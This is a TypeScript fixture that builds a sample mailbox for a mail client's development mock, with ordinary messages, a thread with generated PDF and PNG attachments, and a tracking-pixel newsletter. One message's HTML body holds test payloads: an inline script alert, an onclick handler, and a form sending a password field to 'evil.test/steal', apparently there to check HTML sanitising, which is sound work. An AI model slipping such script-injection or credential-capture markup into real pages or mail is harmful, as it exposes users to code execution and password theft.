// The sample mailbox behind the dev mock (plugin.ts): one account with a few folders, 30-odd messages in the inbox
// including an HTML newsletter with remote images and a cid: image, and a thread with attachments, and mail for each of
// the inbox tabs (its `category` is what the server's header rules would say; plugin.ts applies the account's tabs).
import { crc32, deflateSync } from 'node:zlib';
import type { Address, Category, MailAccount, MailFolder, MessageDetail } from '../src/api';

export interface StoredAttachment {
  filename: string;
  mimeType: string;
  contentId: string | null;
  inline: boolean;
  bytes: Buffer;
}
export interface StoredMessage extends Omit<MessageDetail, 'attachments'> {
  attachments: StoredAttachment[];
}
export interface Mailbox {
  account: MailAccount;
  folders: MailFolder[];
  messages: StoredMessage[];
  nextUid: number;
  /** "Move to tab": the tab chosen per sender address. */
  overrides: Map<string, Category>;
}

const me: Address = { name: 'Ann Lee', address: 'ann@example.com' };
const people: Address[] = [
  { name: 'Bob Martin', address: 'bob@acme.test' },
  { name: 'Chen Wei', address: 'chen@acme.test' },
  { name: 'Dana Ortiz', address: 'dana@studio.test' },
  { name: 'Eli Novak', address: 'eli@novak.test' },
  { name: 'Farah Haddad', address: 'farah@example.org' },
  { name: 'GitHub', address: 'noreply@github.test' },
  { name: 'Grace Kim', address: 'grace@example.org' },
];

/** A solid-colour PNG with a lighter band, built by hand (no image library in the mock). */
export function png(width: number, height: number, [r, g, b]: [number, number, number]): Buffer {
  const chunk = (type: string, data: Buffer) => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body) >>> 0);
    return Buffer.concat([len, body, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  const rows: Buffer[] = [];
  for (let y = 0; y < height; y++) {
    const row = Buffer.alloc(1 + width * 3);
    const band = y > height * 0.35 && y < height * 0.65;
    for (let x = 0; x < width; x++) {
      row[1 + x * 3] = band ? 255 : r;
      row[2 + x * 3] = band ? 255 : g;
      row[3 + x * 3] = band ? 255 : b;
    }
    rows.push(row);
  }
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', ihdr), chunk('IDAT', deflateSync(Buffer.concat(rows))), chunk('IEND', Buffer.alloc(0))]);
}

/** A one-page PDF saying `text`. */
function pdf(text: string): Buffer {
  const stream = `BT /F1 24 Tf 72 720 Td (${text.replace(/[()\\]/g, '')}) Tj ET`;
  const objs = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
    `<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`,
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ];
  let out = '%PDF-1.4\n';
  const offsets: number[] = [];
  objs.forEach((o, i) => {
    offsets.push(out.length);
    out += `${i + 1} 0 obj\n${o}\nendobj\n`;
  });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF`;
  return Buffer.from(out);
}

const SUBJECTS: [string, string][] = [
  ['Lunch on Thursday?', 'Are you free for lunch on Thursday? There is a new ramen place near the office I have been meaning to try.'],
  ['Q4 planning doc', 'I have put the first draft of the Q4 plan in the shared folder. Comments welcome before Friday.'],
  ['Re: Invoice #2291', 'Thanks, the invoice is paid. You should see it on your side in two or three working days.'],
  ['Photos from the offsite', 'Here are the best photos from last week. The one of the sunset over the lake is my favourite.'],
  ['Your weekly summary', 'You had 14 conversations, 3 new followers and 2 pull requests merged this week.'],
  ['Design review moved to 3pm', 'Heads up: the design review is now at 3pm in the big room, so we can include the mobile team.'],
  ['Contract renewal', 'Our contract renews at the end of the month. Could you confirm the number of seats you need?'],
  ['[acme/web] Fix flaky upload test (#812)', 'chen-wei merged 3 commits into main. The upload test no longer depends on the clock.'],
  ['Dinner Saturday', 'We are doing dinner at ours on Saturday at 7. Bring nothing but yourselves!'],
  ['Conference talk accepted', 'Congratulations! Your talk "Mail clients in 2026" has been accepted. Details on the speaker portal.'],
  ['Expense report reminder', 'Please submit your October expenses by Wednesday so they make this month’s payroll.'],
  ['New comment on "Launch plan"', 'Grace commented: "Can we move the press release one day earlier?"'],
];

export function sampleMailbox(): Mailbox {
  const account: MailAccount = {
    id: 'acc_ann',
    email: me.address,
    displayName: me.name,
    imap: { host: 'imap.example.com', port: 993, security: 'tls' },
    smtp: { host: 'smtp.example.com', port: 465, security: 'tls' },
    status: 'ok',
    tabs: ['promotions', 'social', 'updates', 'forums'],
  };
  const folders: MailFolder[] = [
    { path: 'INBOX', name: 'INBOX', delimiter: '/', specialUse: 'inbox', unread: 0, total: 0 },
    { path: 'Sent', name: 'Sent', delimiter: '/', specialUse: 'sent', unread: 0, total: 0 },
    { path: 'Archive', name: 'Archive', delimiter: '/', specialUse: 'archive', unread: 0, total: 0 },
    { path: 'Trash', name: 'Trash', delimiter: '/', specialUse: 'trash', unread: 0, total: 0 },
    { path: 'Projects', name: 'Projects', delimiter: '/', specialUse: null, unread: 0, total: 0 },
    { path: 'Projects/Acme', name: 'Acme', delimiter: '/', specialUse: null, unread: 0, total: 0 },
  ];
  const messages: StoredMessage[] = [];
  let uid = 100;
  const now = Date.now();
  const base = (folder: string, from: Address, minutesAgo: number, subject: string, text: string): StoredMessage => ({
    uid: uid++,
    folder,
    messageId: `<m${uid}@mock.test>`,
    from,
    to: [me],
    cc: [],
    replyTo: [],
    bcc: [],
    subject,
    snippet: text.slice(0, 160),
    date: new Date(now - minutesAgo * 60_000).toISOString(),
    seen: true,
    flagged: false,
    answered: false,
    hasAttachments: false,
    size: 2000 + text.length,
    inReplyTo: null,
    references: [],
    html: null,
    text,
    attachments: [],
  });

  // Older, ordinary mail.
  for (let i = 0; i < 26; i++) {
    const [subject, text] = SUBJECTS[i % SUBJECTS.length]!;
    const m = base('INBOX', people[i % people.length]!, 60 * 24 * (26 - i) + 37 * i, subject, `Hi Ann,\n\n${text}\n\nSee https://example.com/notes/${i} for more.\n\n— ${people[i % people.length]!.name}`);
    m.seen = i % 5 !== 0;
    if (m.from?.address === 'noreply@github.test') m.category = 'updates';
    m.flagged = i % 9 === 3;
    if (i % 4 === 1) m.cc = [people[(i + 2) % people.length]!];
    messages.push(m);
  }

  // A thread with attachments: Bob asks, Ann answers (in Sent), Bob answers with the signed copy.
  const t1 = base('INBOX', people[0]!, 60 * 5, 'Acme proposal — final draft', 'Hi Ann,\n\nAttached is the final draft of the proposal and the budget sheet. Could you take a look before we send it to the client tomorrow?\n\nThanks,\nBob');
  t1.cc = [people[1]!];
  t1.attachments = [
    { filename: 'Acme proposal v3.pdf', mimeType: 'application/pdf', contentId: null, inline: false, bytes: pdf('Acme proposal v3') },
    { filename: 'Budget.csv', mimeType: 'text/csv', contentId: null, inline: false, bytes: Buffer.from('item,cost\nDesign,12000\nBuild,30000\n') },
  ];
  t1.hasAttachments = true;
  messages.push(t1);
  const t2 = base('Sent', me, 60 * 3, 'Re: Acme proposal — final draft', 'Looks great. One small change: the timeline on page 4 should say six weeks, not eight.\n\nAnn');
  t2.to = [people[0]!];
  t2.cc = [people[1]!];
  t2.inReplyTo = t1.messageId;
  t2.references = [t1.messageId!];
  messages.push(t2);
  t1.answered = true;
  const t3 = base('INBOX', people[0]!, 42, 'Re: Acme proposal — final draft', 'Done — updated timeline attached, and the client has signed. Signed copy attached too.\n\nBob');
  t3.cc = [people[1]!];
  t3.inReplyTo = t2.messageId;
  t3.references = [t1.messageId!, t2.messageId!];
  t3.html = `<div style="font-family:Arial,sans-serif;font-size:14px">
<p>Done — updated timeline attached, and the client has <b>signed</b>. Signed copy attached too.</p>
<p>Bob</p>
<blockquote style="border-left:3px solid #ccc;margin:0;padding-left:12px;color:#666">Looks great. One small change: the timeline on page 4 should say six weeks, not eight.</blockquote>
<a href="https://evil.test/track" onclick="alert(1)">tracking link</a>
<script>alert('xss')</script>
<form action="https://evil.test/steal"><input name="password"></form>
</div>`;
  t3.attachments = [
    { filename: 'Acme proposal v4 signed.pdf', mimeType: 'application/pdf', contentId: null, inline: false, bytes: pdf('Acme proposal v4 (signed)') },
    { filename: 'Timeline.png', mimeType: 'image/png', contentId: null, inline: false, bytes: png(320, 120, [52, 168, 83]) },
  ];
  t3.hasAttachments = true;
  t3.seen = false;
  t3.flagged = true;
  messages.push(t3);

  // The newsletter: remote images (held back until "Show images"), a cid: logo, links.
  const news = base('INBOX', { name: 'The Weekly Byte', address: 'news@weeklybyte.test' }, 18, 'This week: faster builds, calmer inboxes', 'The Weekly Byte — issue 142. Faster builds, calmer inboxes, and a look at the new open-source mail clients.');
  news.html = `<!doctype html><html><head><style>
  .wrap{max-width:600px;margin:0 auto;font-family:Georgia,serif;color:#222}
  .hero{background:url(https://picsum.photos/seed/byte/600/200) center/cover;height:120px;border-radius:8px}
  h1{font-size:26px;margin:16px 0 4px} .tag{color:#888;font:12px Arial,sans-serif;text-transform:uppercase;letter-spacing:.08em}
  .card{border:1px solid #eee;border-radius:8px;padding:12px;margin:12px 0}
  .btn{display:inline-block;background:#1a73e8;color:#fff !important;padding:8px 16px;border-radius:6px;text-decoration:none;font-family:Arial,sans-serif}
</style></head><body><div class="wrap">
  <table width="100%"><tr><td><img src="cid:logo@weeklybyte" alt="The Weekly Byte" width="160" height="60"></td><td align="right" class="tag">Issue 142</td></tr></table>
  <div class="hero"></div>
  <h1>Faster builds, calmer inboxes</h1>
  <p class="tag">Five minute read</p>
  <img src="https://picsum.photos/seed/weekly/600/240" alt="A desk with a laptop" width="600" height="240">
  <div class="card"><b>Builds.</b> Incremental compilers are finally the default. We measured a 4× speed-up on a mid-size monorepo.</div>
  <div class="card"><b>Inboxes.</b> Bring-your-own-account mail clients are back, and they render untrusted HTML in sandboxed frames.</div>
  <p><a class="btn" href="https://weeklybyte.test/142">Read the full issue</a></p>
  <img src="https://tracker.weeklybyte.test/open.gif?u=ann" width="1" height="1" alt="">
  <p style="font:12px Arial;color:#999">You are receiving this because you subscribed. <a href="https://weeklybyte.test/unsubscribe">Unsubscribe</a></p>
</div></body></html>`;
  news.attachments = [{ filename: 'logo.png', mimeType: 'image/png', contentId: '<logo@weeklybyte>', inline: true, bytes: png(160, 60, [26, 115, 232]) }];
  news.hasAttachments = false;
  news.seen = false;
  news.category = 'promotions';
  messages.push(news);

  // Mail for the other tabs: a few of each, the newest unread, as the tab bar's "N new" shows.
  const tabMail: [Category, Address, number, string, string, boolean][] = [
    ['promotions', { name: 'The Outdoor Shop', address: 'hello@outdoorshop.test' }, 25, '20% off everything this weekend only', 'Our biggest sale of the season: 20% off tents, packs and boots until Sunday night.', false],
    ['promotions', { name: 'Spotlight Cinemas', address: 'news@spotlight.test' }, 60 * 9, 'Your November film guide', 'Twelve new releases, a classics weekend and members-only screenings this month.', false],
    ['promotions', { name: 'Grocer & Co', address: 'offers@grocer.test' }, 60 * 30, 'Fresh picks for you', 'Seasonal fruit boxes are back. Order by Friday for delivery next week.', true],
    ['social', { name: 'LinkedIn', address: 'invitations@linkedin.test' }, 40, 'Priya Shah wants to connect', 'Priya Shah, Engineering Manager at Northwind, would like to join your professional network.', false],
    ['social', { name: 'Strava', address: 'no-reply@strava.test' }, 60 * 14, 'Chen gave you kudos', 'Chen Wei gave you kudos on your Morning Ride.', true],
    ['updates', { name: 'Amazon.com', address: 'shipment-tracking@amazon.test' }, 33, 'Your order has shipped', 'Your package with "USB-C hub, 7-in-1" is on its way. Arriving Thursday.', false],
    ['updates', { name: 'Northwind Bank', address: 'alerts@northwind-bank.test' }, 60 * 7, 'Your October statement is ready', 'Your statement for the account ending 4421 is ready to view online.', false],
    ['updates', { name: 'Google Calendar', address: 'calendar-notification@google.test' }, 60 * 26, 'Invitation: Design review @ Thu 3pm', 'Bob Martin has invited you to Design review on Thursday at 3pm.', true],
    ['forums', { name: 'Sam Rivera via rust-embedded', address: 'sam@rivera.test' }, 52, '[rust-embedded] HAL traits for async SPI', 'Has anyone tried the new async SPI traits with DMA on the RP2040? I am seeing a stall after the first transfer.', false],
    ['forums', { name: 'Typescript Users', address: 'forum@discourse.test' }, 60 * 20, '[TS] Narrowing a union by a template literal', 'A new reply in the thread "Narrowing a union by a template literal" from Mira.', true],
  ];
  for (const [category, from, minutes, subject, text, seen] of tabMail) {
    const m = base('INBOX', from, minutes, subject, text);
    m.category = category;
    m.seen = seen;
    messages.push(m);
  }

  // The newest: a short unread note.
  const latest = base('INBOX', people[3]!, 6, 'Quick question about the logo', 'Do you still have the SVG of the old logo? Need it for the archive page. dana@studio.test if easier.');
  latest.seen = false;
  messages.push(latest);

  const sentOld = base('Sent', me, 60 * 30, 'Welcome aboard', 'Welcome to the team, Grace! Your laptop arrives Monday.');
  sentOld.to = [people[6]!];
  messages.push(sentOld);
  messages.push(base('Archive', people[4]!, 60 * 24 * 40, 'Tickets for March', 'Your tickets are attached to the booking page.'));
  messages.push(base('Projects/Acme', people[1]!, 60 * 24 * 3, 'Acme kickoff notes', 'Notes from the kickoff are in the doc. Next sync Tuesday.'));

  // The list is by UID, newest first: UIDs follow arrival, as on a real server.
  const inbox = messages.filter((m) => m.folder === 'INBOX').sort((a, b) => a.date.localeCompare(b.date));
  let next = 1;
  for (const m of inbox) m.uid = next++;
  for (const m of messages) if (m.folder !== 'INBOX') m.uid = next++;
  return { account, folders, messages, nextUid: next, overrides: new Map() };
}
